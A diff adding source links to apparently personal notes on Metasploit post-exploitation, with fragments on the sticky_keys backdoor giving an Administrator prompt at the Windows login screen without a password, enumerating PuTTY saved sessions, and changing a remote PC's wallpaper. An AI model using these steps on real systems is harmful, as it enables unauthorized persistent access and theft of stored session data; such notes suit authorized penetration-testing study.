@@ -1,5 +1,6 @@
 *First get the meterpreter session"
 -------------------------------------------------
+https://www.hackingarticles.in/windows-7-sticky-key-hack-attack-using-metasploit/
 sticky_keys module
 
 After getting meterpreter on the remote system, now time to use the post-exploitation module. But this can’t be done from the meterpreter shell. 
@@ -12,6 +13,7 @@ exploit
 So the next time when we invoke the sticky keys pressing shift 5 times, instead of getting the sticky keys prompt we will get an Administrator Command Prompt. 
 The good thing about sticky keys is that it can be invoked on the Login Screen without entering a password
 ---------------------------------------------------------------------------------------------------------------------------------------------------
+https://www.hackingarticles.in/how-to-hack-saved-sessions-in-putty-using-metasploit/
 
 Get putty saved session:
 
@@ -26,6 +28,7 @@ msf exploit (enum_putty_saved_sessions)>set session 1
 msf exploit (enum_putty_saved_sessions)>exploit 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
+https://www.hackingarticles.in/how-to-hack-windows-wallpaper-of-remote-pc/
 Change wallpaper: 
 
 use post/multi/manage/set_wallpaper
